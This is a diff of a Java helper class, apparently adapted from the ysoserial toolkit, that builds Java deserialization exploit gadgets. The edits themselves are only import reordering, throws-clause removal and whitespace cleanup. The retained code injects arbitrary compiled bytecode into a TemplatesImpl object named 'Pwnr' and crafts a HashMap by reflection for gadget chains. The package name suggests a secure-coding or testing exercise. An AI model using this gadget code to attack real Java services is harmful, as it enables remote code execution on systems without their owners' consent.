@@ -22,21 +22,6 @@
 
 package ser05j;
 
-import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
-
-import java.io.Serializable;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
-import java.util.HashMap;
-import java.util.Map;
-
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -44,6 +29,16 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+
+import java.io.Serializable;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.Map;
+
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 
 /*
@@ -70,11 +65,11 @@ public class Gadgets {
 
 
         @Override
-        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException { /* empty block */ }
+        public void transform (DOM document, SerializationHandler[] handlers ) { /* empty block */ }
 
 
         @Override
-        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException { /* empty block */ }
+        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) { /* empty block */ }
     }
 
     // required to make TemplatesImpl happy
@@ -139,21 +134,20 @@ public class Gadgets {
         final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] { 
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
             classBytes, ClassFiles.classAsBytes(Foo.class)
         });
 
         // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, "_name", "Pwnr");  
-        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance()); 
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
 
 
-    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
-            IllegalAccessException, InvocationTargetException {
+    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception {
         HashMap s = new HashMap();
-        Reflections.setFieldValue(s, "size", 2); 
+        Reflections.setFieldValue(s, "size", 2);
         Class nodeC;
         try {
             nodeC = Class.forName("java.util.HashMap$Node"); 
@@ -167,7 +161,7 @@ public class Gadgets {
         Object tbl = Array.newInstance(nodeC, 2);
         Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
         Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
-        Reflections.setFieldValue(s, "table", tbl); 
+        Reflections.setFieldValue(s, "table", tbl);
         return s;
     }
 }
